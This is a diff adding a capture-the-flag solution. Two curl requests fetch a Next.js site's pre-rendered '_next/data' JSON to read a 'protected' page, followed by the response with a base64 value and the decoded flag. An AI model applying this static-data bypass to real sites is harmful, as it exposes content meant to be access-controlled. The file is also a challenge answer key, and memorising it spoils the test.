@@ -1,0 +1,7 @@
+curl https://what-next.ictf.iciaran.com/protected/flag
+curl https://what-next.ictf.iciaran.com/_next/data/aMlWiprh_tXshfanKQ28N/protected/flag.json?post=flag
+{"pageProps":{"title":"Flag","content":"<h1>Flag</h1>\n<h2>Is this what you're looking for?</h2>\n<p>aWN0ZntzbjM0a3lfc3Q0dDFjX2czbjNyNHQxMG59Cg==</p>\n<h2>The code for this challenge is heavily ripped off from</h2>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/tree/canary/examples/blog-starter\">next.js blog starter</a></li>\n<li><a href=\"https://dev.to/ivandotv/protecting-static-pages-in-next-js-application-1e50\">Protecting static pages in Next.js application</a></li>\n</ul>\n","isProtected":true},"__N_SSG":true}
+
+
+ictf{sn34ky_st4t1c_g3n3r4t10n}
+
